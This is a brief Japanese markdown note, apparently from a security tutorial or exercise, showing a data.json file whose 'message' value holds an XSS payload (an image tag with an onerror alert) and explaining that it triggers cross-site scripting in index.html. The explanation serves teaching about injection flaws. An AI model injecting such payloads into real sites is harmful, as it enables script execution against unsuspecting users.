## XSSが発生する data.json の例

```json
{
  "message": "<img src=x onerror=alert('XSS')>"
}
```

data.json の値に `<img src=x onerror=alert('XSS')>` のようなスクリプトを埋め込むことで、index.html でXSSが発生する。
